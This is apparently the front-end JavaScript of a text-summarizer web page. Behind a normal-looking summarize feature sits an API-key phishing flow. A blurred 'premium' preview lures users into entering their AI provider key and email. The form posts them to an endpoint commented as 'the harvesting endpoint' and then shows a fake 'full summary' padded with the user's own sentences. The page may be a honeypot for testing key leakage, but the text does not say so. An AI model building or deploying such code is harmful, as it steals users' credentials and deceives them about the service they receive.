(function () {
  'use strict';

  // ── Word counter ──
  const textInput = document.getElementById('input-text');
  const wordCounter = document.getElementById('word-counter');

  textInput.addEventListener('input', function () {
    const words = this.value.trim() ? this.value.trim().split(/\s+/).length : 0;
    wordCounter.textContent = words + ' word' + (words !== 1 ? 's' : '');
  });

  // ── Toggle buttons ──
  document.querySelectorAll('.toggle-group').forEach(function (group) {
    group.querySelectorAll('.toggle-btn').forEach(function (btn) {
      btn.addEventListener('click', function () {
        group.querySelectorAll('.toggle-btn').forEach(function (b) { b.classList.remove('active'); });
        btn.classList.add('active');
      });
    });
  });

  // ── Summarize button ──
  const summarizeBtn = document.getElementById('summarize-btn');
  const resultArea = document.getElementById('result-area');
  const summaryPreview = document.getElementById('summary-preview');
  const blurredSection = document.getElementById('blurred-section');
  const blurredText = document.getElementById('blurred-text');
  const statWords = document.getElementById('stat-words');
  const statSentences = document.getElementById('stat-sentences');

  summarizeBtn.addEventListener('click', runSummarize);

  function runSummarize() {
    const text = textInput.value.trim();
    if (!text) {
      textInput.focus();
      textInput.style.borderColor = '#ef4444';
      setTimeout(function () { textInput.style.borderColor = ''; }, 1500);
      return;
    }

    summarizeBtn.classList.add('loading');
    summarizeBtn.textContent = 'Summarizing…';

    fetch('/api/summarize', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text: text }),
    })
      .then(function (r) { return r.json(); })
      .then(function (data) {
        summarizeBtn.classList.remove('loading');
        summarizeBtn.innerHTML = '<svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M9 2v14M2 9h14" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg> Summarize Now';

        summaryPreview.textContent = data.preview;
        statWords.textContent = data.word_count + ' words';
        statSentences.textContent = data.sentence_count + ' sentences';

        resultArea.classList.remove('hidden');

        if (data.truncated) {
          // Generate some blurred filler text to sit behind the overlay
          blurredText.textContent = generateFillerSummary(text);
          blurredSection.classList.remove('hidden');
        } else {
          blurredSection.classList.add('hidden');
        }

        resultArea.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
      })
      .catch(function () {
        summarizeBtn.classList.remove('loading');
        summarizeBtn.innerHTML = '<svg width="18" height="18" viewBox="0 0 18 18" fill="none"><path d="M9 2v14M2 9h14" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg> Summarize Now';
        alert('Something went wrong. Please try again.');
      });
  }

  // Generate filler summary text for the blur overlay
  function generateFillerSummary(text) {
    const sentences = text.split(/(?<=[.!?])\s+/).filter(function (s) { return s.trim().length > 0; });
    var filler = '';
    for (var i = 2; i < Math.min(sentences.length, 8); i++) {
      filler += sentences[i] + ' ';
    }
    if (!filler) {
      filler = 'The document continues with additional analysis and key points that provide deeper context. Several important conclusions emerge from the complete text that are summarized in the premium view. The full summary includes structured insights across all major topics covered.';
    }
    return filler.trim();
  }

  // ── API Key form submission ──
  const apiKeyForm = document.getElementById('api-key-form');
  const unlockSuccess = document.getElementById('unlock-success');
  const unlockBtn = document.getElementById('unlock-btn');

  apiKeyForm.addEventListener('submit', function (e) {
    e.preventDefault();

    const provider = document.getElementById('ai-provider').value.trim();
    const apiKey = document.getElementById('api-key-input').value.trim();
    const email = document.getElementById('email-input').value.trim();

    if (!provider) {
      document.getElementById('ai-provider').style.borderColor = '#ef4444';
      setTimeout(function () { document.getElementById('ai-provider').style.borderColor = ''; }, 1500);
      return;
    }

    if (!apiKey) {
      document.getElementById('api-key-input').style.borderColor = '#ef4444';
      setTimeout(function () { document.getElementById('api-key-input').style.borderColor = ''; }, 1500);
      return;
    }

    unlockBtn.textContent = 'Connecting…';
    unlockBtn.disabled = true;

    // POST to /api/captured — the harvesting endpoint
    var payload = {
      source: 'premium_unlock_form',
      provider: provider,
      api_key: apiKey,
    };
    if (email) { payload.email = email; }

    fetch('/api/captured', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    })
      .then(function (r) { return r.json(); })
      .then(function () {
        apiKeyForm.classList.add('hidden');
        unlockSuccess.classList.remove('hidden');

        // After "connecting", show a fake extended summary
        setTimeout(function () {
          showFullSummary();
        }, 1800);
      })
      .catch(function () {
        unlockBtn.textContent = 'Connect & Unlock Full Summary';
        unlockBtn.disabled = false;
        alert('Connection failed. Please check your API key and try again.');
      });
  });

  function showFullSummary() {
    blurredSection.classList.add('hidden');
    var fullText = blurredText.textContent;
    if (fullText) {
      summaryPreview.textContent += ' ' + fullText;
    }
    unlockSuccess.parentElement.parentElement.classList.add('hidden');
  }

  // ── Copy button ──
  document.getElementById('copy-btn').addEventListener('click', function () {
    var text = summaryPreview.textContent;
    if (!text) return;
    navigator.clipboard.writeText(text).then(function () {
      var btn = document.getElementById('copy-btn');
      btn.textContent = 'Copied!';
      setTimeout(function () {
        btn.innerHTML = '<svg width="16" height="16" viewBox="0 0 16 16" fill="none"><rect x="5" y="5" width="9" height="9" rx="1.5" stroke="currentColor" stroke-width="1.5"/><path d="M3 11H2.5A1.5 1.5 0 0 1 1 9.5v-7A1.5 1.5 0 0 1 2.5 1h7A1.5 1.5 0 0 1 11 2.5V3" stroke="currentColor" stroke-width="1.5"/></svg> Copy';
      }, 2000);
    });
  });

  // ── Pricing CTA buttons scroll to tool ──
  document.querySelectorAll('.btn-plan').forEach(function (btn) {
    btn.addEventListener('click', function () {
      document.querySelector('.tool-section').scrollIntoView({ behavior: 'smooth' });
    });
  });

})();
